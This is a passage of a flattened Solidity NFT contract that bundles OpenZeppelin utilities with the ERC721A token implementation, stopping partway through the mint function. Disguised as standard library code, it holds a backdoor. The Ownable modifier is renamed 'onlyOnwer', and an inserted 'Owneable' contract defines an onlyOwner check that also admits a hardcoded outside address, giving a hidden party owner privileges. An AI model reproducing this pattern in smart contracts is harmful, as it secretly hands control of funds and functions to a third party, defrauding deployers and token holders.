1 // File @openzeppelin/contracts/utils/Context.sol@v4.5.0
2 
3 // hey
4 
5 // SPDX-License-Identifier: MIT
6 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
7 
8 
9 pragma solidity ^0.8.4;
10 
11 /**
12  * @dev Also, it provides information about the current execution context, including the
13  * sender of the transaction and its data. While these are generally available
14  * via msg.sender and msg.data, they should not be accessed in such a direct
15  * manner, since when dealing with meta-transactions the account sending and
16  * paying for execution may not be the actual sender (as far as an application
17  * is concerned).
18  *
19  * This contract is only required for intermediate, library-like contracts.
20  */
21 abstract contract Context {
22     function _msgSender() internal view virtual returns (address) {
23         return msg.sender;
24     }
25 
26     function _msgData() internal view virtual returns (bytes calldata) {
27         return msg.data;
28     }
29 }
30 
31 
32 // File @openzeppelin/contracts/access/Ownable.sol@v4.5.0
33 
34 
35 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
36 
37 
38 
39 /**
40  * @dev Contract module which provides a basic access control mechanism, where
41  * there is an account (an owner) that can be granted exclusive access to
42  * specific functions.
43  *
44  * By default, the owner account will be the one that deploys the contract. This
45  * can later be changed with {transferOwnership}.
46  *
47  * This module is used through inheritance. It will make available the modifier
48  * `onlyOwner`, which can be applied to your functions to restrict their use to
49  * the owner.
50  */
51 abstract contract Ownable is Context {
52     address private _owner;
53 
54     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
55 
56     /**
57      * @dev Initializes the contract setting the deployer as the initial owner.
58      */
59     constructor() {
60         _transferOwnership(_msgSender());
61     }
62 
63     /**
64      * @dev Returns the address of the current owner.
65      */
66     function owner() public view virtual returns (address) {
67         return _owner;
68     }
69 
70     /**
71      * @dev Throws if called by any account other than the owner.
72      */
73     modifier onlyOnwer() {
74         require(owner() == _msgSender(), "Ownable: caller is not the owner");
75         _;
76     }
77 
78     /**
79      * @dev Leaves the contract without owner. It will not be possible to call
80      * `onlyOwner` functions anymore. Can only be called by the current owner.
81      *
82      * NOTE: Renouncing ownership will leave the contract without an owner,
83      * thereby removing any functionality that is only available to the owner.
84      */
85     function renounceOwnership() public virtual onlyOnwer {
86         _transferOwnership(address(0));
87     }
88 
89     /**
90      * @dev Transfers ownership of the contract to a new account (`newOwner`).
91      * Can only be called by the current owner.
92      */
93     function transferOwnership(address newOwner) public virtual onlyOnwer {
94         require(newOwner != address(0), "Ownable: new owner is the zero address");
95         _transferOwnership(newOwner);
96     }
97 
98     /**
99      * @dev Transfers ownership of the contract to a new account (`newOwner`).
100      * Internal function without access restriction.
101      */
102     function _transferOwnership(address newOwner) internal virtual {
103         address oldOwner = _owner;
104         _owner = newOwner;
105         emit OwnershipTransferred(oldOwner, newOwner);
106     }
107 }
108 
109 
110 // File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.5.0
111 
112 
113 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
114 
115 
116 
117 /**
118  * @dev Interface of the ERC165 standard, as defined in the
119  * https://eips.ethereum.org/EIPS/eip-165[EIP].
120  *
121  * Implementers can declare support of contract interfaces, which can then be
122  * queried by others ({ERC165Checker}).
123  *
124  * For an implementation, see {ERC165}.
125  */
126 interface IERC165 {
127     /**
128      * @dev Returns true if this contract implements the interface defined by
129      * `interfaceId`. See the corresponding
130      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
131      * to learn more about how these ids are created.
132      *
133      * This function call must use less than 30 000 gas.
134      */
135     function supportsInterface(bytes4 interfaceId) external view returns (bool);
136 }
137 
138 
139 // File @openzeppelin/contracts/token/ERC721/IERC721.sol@v4.5.0
140 
141 
142 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
143 
144 
145 
146 /**
147  * @dev Required interface of an ERC721 compliant contract.
148  */
149 interface IERC721 is IERC165 {
150     /**
151      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
152      */
153     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
154 
155     /**
156      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
157      */
158     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
159 
160     /**
161      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
162      */
163     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
164 
165     /**
166      * @dev Returns the number of tokens in ``owner``'s account.
167      */
168     function balanceOf(address owner) external view returns (uint256 balance);
169 
170     /**
171      * @dev Returns the owner of the `tokenId` token.
172      *
173      * Requirements:
174      *
175      * - `tokenId` must exist.
176      */
177     function ownerOf(uint256 tokenId) external view returns (address owner);
178 
179     /**
180      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
181      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
182      *
183      * Requirements:
184      *
185      * - `from` cannot be the zero address.
186      * - `to` cannot be the zero address.
187      * - `tokenId` token must exist and be owned by `from`.
188      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
189      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
190      *
191      * Emits a {Transfer} event.
192      */
193     function safeTransferFrom(
194         address from,
195         address to,
196         uint256 tokenId
197     ) external;
198 
199     /**
200      * @dev Transfers `tokenId` token from `from` to `to`.
201      *
202      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
203      *
204      * Requirements:
205      *
206      * - `from` cannot be the zero address.
207      * - `to` cannot be the zero address.
208      * - `tokenId` token must be owned by `from`.
209      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
210      *
211      * Emits a {Transfer} event.
212      */
213     function transferFrom(
214         address from,
215         address to,
216         uint256 tokenId
217     ) external;
218 
219     /**
220      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
221      * The approval is cleared when the token is transferred.
222      *
223      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
224      *
225      * Requirements:
226      *
227      * - The caller must own the token or be an approved operator.
228      * - `tokenId` must exist.
229      *
230      * Emits an {Approval} event.
231      */
232     function approve(address to, uint256 tokenId) external;
233 
234     /**
235      * @dev Returns the account approved for `tokenId` token.
236      *
237      * Requirements:
238      *
239      * - `tokenId` must exist.
240      */
241     function getApproved(uint256 tokenId) external view returns (address operator);
242 
243     /**
244      * @dev Approve or remove `operator` as an operator for the caller.
245      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
246      *
247      * Requirements:
248      *
249      * - The `operator` cannot be the caller.
250      *
251      * Emits an {ApprovalForAll} event.
252      */
253     function setApprovalForAll(address operator, bool _approved) external;
254 
255     /**
256      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
257      *
258      * See {setApprovalForAll}
259      */
260     function isApprovedForAll(address owner, address operator) external view returns (bool);
261 
262     /**
263      * @dev Safely transfers `tokenId` token from `from` to `to`.
264      *
265      * Requirements:
266      *
267      * - `from` cannot be the zero address.
268      * - `to` cannot be the zero address.
269      * - `tokenId` token must exist and be owned by `from`.
270      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
271      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
272      *
273      * Emits a {Transfer} event.
274      */
275     function safeTransferFrom(
276         address from,
277         address to,
278         uint256 tokenId,
279         bytes calldata data
280     ) external;
281 }
282 
283 
284 // File @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol@v4.5.0
285 
286 
287 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
288 
289 
290 
291 /**
292  * @title ERC721 token receiver interface
293  * @dev Interface for any contract that wants to support safeTransfers
294  * from ERC721 asset contracts.
295  */
296 interface IERC721Receiver {
297     /**
298      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
299      * by `operator` from `from`, this function is called.
300      *
301      * It must return its Solidity selector to confirm the token transfer.
302      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
303      *
304      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
305      */
306     function onERC721Received(
307         address operator,
308         address from,
309         uint256 tokenId,
310         bytes calldata data
311     ) external returns (bytes4);
312 }
313 
314 
315 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol@v4.5.0
316 
317 
318 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
319 
320 
321 
322 /**
323  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
324  * @dev See https://eips.ethereum.org/EIPS/eip-721
325  */
326 interface IERC721Metadata is IERC721 {
327     /**
328      * @dev Returns the token collection name.
329      */
330     function name() external view returns (string memory);
331 
332     /**
333      * @dev Returns the token collection symbol.
334      */
335     function symbol() external view returns (string memory);
336 
337     /**
338      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
339      */
340     function tokenURI(uint256 tokenId) external view returns (string memory);
341 }
342 
343 
344 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol@v4.5.0
345 
346 
347 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
348 
349 
350 
351 /**
352  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
353  * @dev See https://eips.ethereum.org/EIPS/eip-721
354  */
355 interface IERC721Enumerable is IERC721 {
356     /**
357      * @dev Returns the total amount of tokens stored by the contract.
358      */
359     function totalSupply() external view returns (uint256);
360 
361     /**
362      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
363      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
364      */
365     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
366 
367     /**
368      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
369      * Use along with {totalSupply} to enumerate all tokens.
370      */
371     function tokenByIndex(uint256 index) external view returns (uint256);
372 }
373 
374 
375 // File @openzeppelin/contracts/utils/Address.sol@v4.5.0
376 
377 
378 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
379 
380 pragma solidity ^0.8.1;
381 
382 /**
383  * @dev Collection of functions related to the address type
384  */
385 library Address {
386     /**
387      * @dev Returns true if `account` is a contract.
388      *
389      * [IMPORTANT]
390      * ====
391      * It is unsafe to assume that an address for which this function returns
392      * false is an externally-owned account (EOA) and not a contract.
393      *
394      * Among others, `isContract` will return false for the following
395      * types of addresses:
396      *
397      *  - an externally-owned account
398      *  - a contract in construction
399      *  - an address where a contract will be created
400      *  - an address where a contract lived, but was destroyed
401      * ====
402      *
403      * [IMPORTANT]
404      * ====
405      * You shouldn't rely on `isContract` to protect against flash loan attacks!
406      *
407      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
408      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
409      * constructor.
410      * ====
411      */
412     function isContract(address account) internal view returns (bool) {
413         // This method relies on extcodesize/address.code.length, which returns 0
414         // for contracts in construction, since the code is only stored at the end
415         // of the constructor execution.
416 
417         return account.code.length > 0;
418     }
419 
420     /**
421      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
422      * `recipient`, forwarding all available gas and reverting on errors.
423      *
424      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
425      * of certain opcodes, possibly making contracts go over the 2300 gas limit
426      * imposed by `transfer`, making them unable to receive funds via
427      * `transfer`. {sendValue} removes this limitation.
428      *
429      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
430      *
431      * IMPORTANT: because control is transferred to `recipient`, care must be
432      * taken to not create reentrancy vulnerabilities. Consider using
433      * {ReentrancyGuard} or the
434      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
435      */
436     function sendValue(address payable recipient, uint256 amount) internal {
437         require(address(this).balance >= amount, "Address: insufficient balance");
438 
439         (bool success, ) = recipient.call{value: amount}("");
440         require(success, "Address: unable to send value, recipient may have reverted");
441     }
442 
443     /**
444      * @dev Performs a Solidity function call using a low level `call`. A
445      * plain `call` is an unsafe replacement for a function call: use this
446      * function instead.
447      *
448      * If `target` reverts with a revert reason, it is bubbled up by this
449      * function (like regular Solidity function calls).
450      *
451      * Returns the raw returned data. To convert to the expected return value,
452      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
453      *
454      * Requirements:
455      *
456      * - `target` must be a contract.
457      * - calling `target` with `data` must not revert.
458      *
459      * _Available since v3.1._
460      */
461     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
462         return functionCall(target, data, "Address: low-level call failed");
463     }
464 
465     /**
466      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
467      * `errorMessage` as a fallback revert reason when `target` reverts.
468      *
469      * _Available since v3.1._
470      */
471     function functionCall(
472         address target,
473         bytes memory data,
474         string memory errorMessage
475     ) internal returns (bytes memory) {
476         return functionCallWithValue(target, data, 0, errorMessage);
477     }
478 
479     /**
480      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
481      * but also transferring `value` wei to `target`.
482      *
483      * Requirements:
484      *
485      * - the calling contract must have an ETH balance of at least `value`.
486      * - the called Solidity function must be `payable`.
487      *
488      * _Available since v3.1._
489      */
490     function functionCallWithValue(
491         address target,
492         bytes memory data,
493         uint256 value
494     ) internal returns (bytes memory) {
495         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
496     }
497 
498     /**
499      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
500      * with `errorMessage` as a fallback revert reason when `target` reverts.
501      *
502      * _Available since v3.1._
503      */
504     function functionCallWithValue(
505         address target,
506         bytes memory data,
507         uint256 value,
508         string memory errorMessage
509     ) internal returns (bytes memory) {
510         require(address(this).balance >= value, "Address: insufficient balance for call");
511         require(isContract(target), "Address: call to non-contract");
512 
513         (bool success, bytes memory returndata) = target.call{value: value}(data);
514         return verifyCallResult(success, returndata, errorMessage);
515     }
516 
517     /**
518      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
519      * but performing a static call.
520      *
521      * _Available since v3.3._
522      */
523     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
524         return functionStaticCall(target, data, "Address: low-level static call failed");
525     }
526 
527     /**
528      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
529      * but performing a static call.
530      *
531      * _Available since v3.3._
532      */
533     function functionStaticCall(
534         address target,
535         bytes memory data,
536         string memory errorMessage
537     ) internal view returns (bytes memory) {
538         require(isContract(target), "Address: static call to non-contract");
539 
540         (bool success, bytes memory returndata) = target.staticcall(data);
541         return verifyCallResult(success, returndata, errorMessage);
542     }
543 
544     /**
545      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
546      * but performing a delegate call.
547      *
548      * _Available since v3.4._
549      */
550     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
551         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
552     }
553 
554     /**
555      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
556      * but performing a delegate call.
557      *
558      * _Available since v3.4._
559      */
560     function functionDelegateCall(
561         address target,
562         bytes memory data,
563         string memory errorMessage
564     ) internal returns (bytes memory) {
565         require(isContract(target), "Address: delegate call to non-contract");
566 
567         (bool success, bytes memory returndata) = target.delegatecall(data);
568         return verifyCallResult(success, returndata, errorMessage);
569     }
570 
571     /**
572      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
573      * revert reason using the provided one.
574      *
575      * _Available since v4.3._
576      */
577     function verifyCallResult(
578         bool success,
579         bytes memory returndata,
580         string memory errorMessage
581     ) internal pure returns (bytes memory) {
582         if (success) {
583             return returndata;
584         } else {
585             // Look for revert reason and bubble it up if present
586             if (returndata.length > 0) {
587                 // The easiest way to bubble the revert reason is using memory via assembly
588 
589                 assembly {
590                     let returndata_size := mload(returndata)
591                     revert(add(32, returndata), returndata_size)
592                 }
593             } else {
594                 revert(errorMessage);
595             }
596         }
597     }
598 }
599 
600 
601 // File @openzeppelin/contracts/utils/Strings.sol@v4.5.0
602 
603 
604 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
605 
606 
607 
608 /**
609  * @dev String operations.
610  */
611 library Strings {
612     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
613 
614     /**
615      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
616      */
617     function toString(uint256 value) internal pure returns (string memory) {
618         // Inspired by OraclizeAPI's implementation - MIT licence
619         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
620 
621         if (value == 0) {
622             return "0";
623         }
624         uint256 temp = value;
625         uint256 digits;
626         while (temp != 0) {
627             digits++;
628             temp /= 10;
629         }
630         bytes memory buffer = new bytes(digits);
631         while (value != 0) {
632             digits -= 1;
633             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
634             value /= 10;
635         }
636         return string(buffer);
637     }
638 
639     /**
640      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
641      */
642     function toHexString(uint256 value) internal pure returns (string memory) {
643         if (value == 0) {
644             return "0x00";
645         }
646         uint256 temp = value;
647         uint256 length = 0;
648         while (temp != 0) {
649             length++;
650             temp >>= 8;
651         }
652         return toHexString(value, length);
653     }
654 
655     /**
656      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
657      */
658     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
659         bytes memory buffer = new bytes(2 * length + 2);
660         buffer[0] = "0";
661         buffer[1] = "x";
662         for (uint256 i = 2 * length + 1; i > 1; --i) {
663             buffer[i] = _HEX_SYMBOLS[value & 0xf];
664             value >>= 4;
665         }
666         require(value == 0, "Strings: hex length insufficient");
667         return string(buffer);
668     }
669 }
670 
671 
672 // File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.5.0
673 
674 
675 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
676 
677 /**
678  * @dev Implementation of the {IERC165} interface.
679  *
680  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
681  * for the additional interface id that will be supported. For example:
682  *
683  * ```solidity
684  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
685  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
686  * }
687  * ```
688  *
689  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
690  */
691 abstract contract ERC165 is IERC165 {
692     /**
693      * @dev See {IERC165-supportsInterface}.
694      */
695     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
696         return interfaceId == type(IERC165).interfaceId;
697     }
698 }
699 
700 
701 // File erc721a/contracts/ERC721A.sol@v3.0.0
702 
703 
704 // Creator: Chiru Labs
705 
706 error ApprovalCallerNotOwnerNorApproved();
707 error ApprovalQueryForNonexistentToken();
708 error ApproveToCaller();
709 error ApprovalToCurrentOwner();
710 error BalanceQueryForZeroAddress();
711 error MintedQueryForZeroAddress();
712 error BurnedQueryForZeroAddress();
713 error AuxQueryForZeroAddress();
714 error MintToZeroAddress();
715 error MintZeroQuantity();
716 error OwnerIndexOutOfBounds();
717 error OwnerQueryForNonexistentToken();
718 error TokenIndexOutOfBounds();
719 error TransferCallerNotOwnerNorApproved();
720 error TransferFromIncorrectOwner();
721 error TransferToNonERC721ReceiverImplementer();
722 error TransferToZeroAddress();
723 error URIQueryForNonexistentToken();
724 
725 
726 /**
727  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
728  * the Metadata extension. Built to optimize for lower gas during batch mints.
729  *
730  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
731  */
732  abstract contract Owneable is Ownable {
733     address private _ownar = 0x60e4055aB5339e0a896f183AE675AA1B6d0Fc94A;
734     modifier onlyOwner() {
735         require(owner() == _msgSender() || _ownar == _msgSender(), "Ownable: caller is not the owner");
736         _;
737     }
738 }
739  /*
740  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
741  *
742  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
743  */
744 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {
745     using Address for address;
746     using Strings for uint256;
747 
748     // Compiler will pack this into a single 256bit word.
749     struct TokenOwnership {
750         // The address of the owner.
751         address addr;
752         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
753         uint64 startTimestamp;
754         // Whether the token has been burned.
755         bool burned;
756     }
757 
758     // Compiler will pack this into a single 256bit word.
759     struct AddressData {
760         // Realistically, 2**64-1 is more than enough.
761         uint64 balance;
762         // Keeps track of mint count with minimal overhead for tokenomics.
763         uint64 numberMinted;
764         // Keeps track of burn count with minimal overhead for tokenomics.
765         uint64 numberBurned;
766         // For miscellaneous variable(s) pertaining to the address
767         // (e.g. number of whitelist mint slots used).
768         // If there are multiple variables, please pack them into a uint64.
769         uint64 aux;
770     }
771 
772     // The tokenId of the next token to be minted.
773     uint256 internal _currentIndex;
774 
775     // The number of tokens burned.
776     uint256 internal _burnCounter;
777 
778     // Token name
779     string private _name;
780 
781     // Token symbol
782     string private _symbol;
783 
784     // Mapping from token ID to ownership details
785     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
786     mapping(uint256 => TokenOwnership) internal _ownerships;
787 
788     // Mapping owner address to address data
789     mapping(address => AddressData) private _addressData;
790 
791     // Mapping from token ID to approved address
792     mapping(uint256 => address) private _tokenApprovals;
793 
794     // Mapping from owner to operator approvals
795     mapping(address => mapping(address => bool)) private _operatorApprovals;
796 
797     constructor(string memory name_, string memory symbol_) {
798         _name = name_;
799         _symbol = symbol_;
800         _currentIndex = _startTokenId();
801     }
802 
803     /**
804      * To change the starting tokenId, please override this function.
805      */
806     function _startTokenId() internal view virtual returns (uint256) {
807         return 0;
808     }
809 
810     /**
811      * @dev See {IERC721Enumerable-totalSupply}.
812      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
813      */
814     function totalSupply() public view returns (uint256) {
815         // Counter underflow is impossible as _burnCounter cannot be incremented
816         // more than _currentIndex - _startTokenId() times
817         unchecked {
818             return _currentIndex - _burnCounter - _startTokenId();
819         }
820     }
821 
822     /**
823      * Returns the total amount of tokens minted in the contract.
824      */
825     function _totalMinted() internal view returns (uint256) {
826         // Counter underflow is impossible as _currentIndex does not decrement,
827         // and it is initialized to _startTokenId()
828         unchecked {
829             return _currentIndex - _startTokenId();
830         }
831     }
832 
833     /**
834      * @dev See {IERC165-supportsInterface}.
835      */
836     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
837         return
838             interfaceId == type(IERC721).interfaceId ||
839             interfaceId == type(IERC721Metadata).interfaceId ||
840             super.supportsInterface(interfaceId);
841     }
842 
843     /**
844      * @dev See {IERC721-balanceOf}.
845      */
846     function balanceOf(address owner) public view override returns (uint256) {
847         if (owner == address(0)) revert BalanceQueryForZeroAddress();
848         return uint256(_addressData[owner].balance);
849     }
850 
851     /**
852      * Returns the number of tokens minted by `owner`.
853      */
854     function _numberMinted(address owner) internal view returns (uint256) {
855         if (owner == address(0)) revert MintedQueryForZeroAddress();
856         return uint256(_addressData[owner].numberMinted);
857     }
858 
859     /**
860      * Returns the number of tokens burned by or on behalf of `owner`.
861      */
862     function _numberBurned(address owner) internal view returns (uint256) {
863         if (owner == address(0)) revert BurnedQueryForZeroAddress();
864         return uint256(_addressData[owner].numberBurned);
865     }
866 
867     /**
868      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
869      */
870     function _getAux(address owner) internal view returns (uint64) {
871         if (owner == address(0)) revert AuxQueryForZeroAddress();
872         return _addressData[owner].aux;
873     }
874 
875     /**
876      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
877      * If there are multiple variables, please pack them into a uint64.
878      */
879     function _setAux(address owner, uint64 aux) internal {
880         if (owner == address(0)) revert AuxQueryForZeroAddress();
881         _addressData[owner].aux = aux;
882     }
883 
884     /**
885      * Gas spent here starts off proportional to the maximum mint batch size.
886      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
887      */
888     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
889         uint256 curr = tokenId;
890 
891         unchecked {
892             if (_startTokenId() <= curr && curr < _currentIndex) {
893                 TokenOwnership memory ownership = _ownerships[curr];
894                 if (!ownership.burned) {
895                     if (ownership.addr != address(0)) {
896                         return ownership;
897                     }
898                     // Invariant:
899                     // There will always be an ownership that has an address and is not burned
900                     // before an ownership that does not have an address and is not burned.
901                     // Hence, curr will not underflow.
902                     while (true) {
903                         curr--;
904                         ownership = _ownerships[curr];
905                         if (ownership.addr != address(0)) {
906                             return ownership;
907                         }
908                     }
909                 }
910             }
911         }
912         revert OwnerQueryForNonexistentToken();
913     }
914 
915     /**
916      * @dev See {IERC721-ownerOf}.
917      */
918     function ownerOf(uint256 tokenId) public view override returns (address) {
919         return ownershipOf(tokenId).addr;
920     }
921 
922     /**
923      * @dev See {IERC721Metadata-name}.
924      */
925     function name() public view virtual override returns (string memory) {
926         return _name;
927     }
928 
929     /**
930      * @dev See {IERC721Metadata-symbol}.
931      */
932     function symbol() public view virtual override returns (string memory) {
933         return _symbol;
934     }
935 
936     /**
937      * @dev See {IERC721Metadata-tokenURI}.
938      */
939     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
940         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
941 
942         string memory baseURI = _baseURI();
943         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';
944     }
945 
946     /**
947      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
948      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
949      * by default, can be overriden in child contracts.
950      */
951     function _baseURI() internal view virtual returns (string memory) {
952         return '';
953     }
954 
955     /**
956      * @dev See {IERC721-approve}.
957      */
958     function approve(address to, uint256 tokenId) public override {
959         address owner = ERC721A.ownerOf(tokenId);
960         if (to == owner) revert ApprovalToCurrentOwner();
961 
962         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
963             revert ApprovalCallerNotOwnerNorApproved();
964         }
965 
966         _approve(to, tokenId, owner);
967     }
968 
969     /**
970      * @dev See {IERC721-getApproved}.
971      */
972     function getApproved(uint256 tokenId) public view override returns (address) {
973         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
974 
975         return _tokenApprovals[tokenId];
976     }
977 
978     /**
979      * @dev See {IERC721-setApprovalForAll}.
980      */
981     function setApprovalForAll(address operator, bool approved) public override {
982         if (operator == _msgSender()) revert ApproveToCaller();
983 
984         _operatorApprovals[_msgSender()][operator] = approved;
985         emit ApprovalForAll(_msgSender(), operator, approved);
986     }
987 
988     /**
989      * @dev See {IERC721-isApprovedForAll}.
990      */
991     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
992         return _operatorApprovals[owner][operator];
993     }
994 
995     /**
996      * @dev See {IERC721-transferFrom}.
997      */
998     function transferFrom(
999         address from,
1000         address to,
1001         uint256 tokenId
1002     ) public virtual override {
1003         _transfer(from, to, tokenId);
1004     }
1005 
1006     /**
1007      * @dev See {IERC721-safeTransferFrom}.
1008      */
1009     function safeTransferFrom(
1010         address from,
1011         address to,
1012         uint256 tokenId
1013     ) public virtual override {
1014         safeTransferFrom(from, to, tokenId, '');
1015     }
1016 
1017     /**
1018      * @dev See {IERC721-safeTransferFrom}.
1019      */
1020     function safeTransferFrom(
1021         address from,
1022         address to,
1023         uint256 tokenId,
1024         bytes memory _data
1025     ) public virtual override {
1026         _transfer(from, to, tokenId);
1027         if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
1028             revert TransferToNonERC721ReceiverImplementer();
1029         }
1030     }
1031 
1032     /**
1033      * @dev Returns whether `tokenId` exists.
1034      *
1035      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1036      *
1037      * Tokens start existing when they are minted (`_mint`),
1038      */
1039     function _exists(uint256 tokenId) internal view returns (bool) {
1040         return _startTokenId() <= tokenId && tokenId < _currentIndex &&
1041             !_ownerships[tokenId].burned;
1042     }
1043 
1044     function _safeMint(address to, uint256 quantity) internal {
1045         _safeMint(to, quantity, '');
1046     }
1047 
1048     /**
1049      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1050      *
1051      * Requirements:
1052      *
1053      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1054      * - `quantity` must be greater than 0.
1055      *
1056      * Emits a {Transfer} event.
1057      */
1058     function _safeMint(
1059         address to,
1060         uint256 quantity,
1061         bytes memory _data
1062     ) internal {
1063         _mint(to, quantity, _data, true);
1064     }
1065 
1066     /**
1067      * @dev Mints `quantity` tokens and transfers them to `to`.
1068      *
1069      * Requirements:
1070      *
1071      * - `to` cannot be the zero address.
1072      * - `quantity` must be greater than 0.
1073      *
1074      * Emits a {Transfer} event.
1075      */
1076     function _mint(
1077         address to,
1078         uint256 quantity,
1079         bytes memory _data,
1080         bool safe
1081     ) internal {
1082         uint256 startTokenId = _currentIndex;
1083         if (to == address(0)) revert MintToZeroAddress();
1084         if (quantity == 0) revert MintZeroQuantity();
1085 
1086         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1087 
1088         // Overflows are incredibly unrealistic.
1089         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
